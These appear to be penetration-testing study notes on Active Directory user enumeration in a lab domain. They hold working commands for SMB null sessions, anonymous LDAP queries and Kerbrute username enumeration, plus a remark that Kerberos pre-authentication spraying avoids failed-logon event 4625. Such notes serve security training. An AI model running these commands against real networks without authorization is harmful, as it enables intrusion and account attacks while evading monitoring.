## SMB NULL Session to Pull User List
- If we are on an internal machine with no valid credentials, we can try `SMB NULL sessions` or `LDAP anonymous binds`.

#### Using enum4linux for SMB NULL Session attack

```python
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

#### Using rpcclient for SMB NULL Session Attack

```python
rpcclient -U "" -N <172.16.5.5
$> enumdomusers
```

#### Using netexec --users flag

```python
nxc smb 172.16.5.5 --users
```


## Gathering Users with LDAP Anonymous

#### Using ldapsearch
```python
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```
## Enumerating Users with Kerbrute

#### Kerberos Pre-Authentication Password Spraying

**Key Concept** Uses Kerberos Pre-Authentication to perform password spraying against a domain controller.

**Why It's Stealthier**

- Does **not** generate Windows Event ID **4625** (Account Logon Failure)
- Traditional logon failures are commonly monitored/alerted on — this method bypasses that

**Username Enumeration Method**

- Sends **TGT (Ticket Granting Ticket)** requests to the KDC (Key Distribution Center) _without_ Pre-Authentication
- If the KDC returns **`PRINCIPAL UNKNOWN`** → username is **invalid**
- KDC prompts for Kerberos Pre-authentication → username **exists**

#### Kerbrute User Enumeration
```python
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
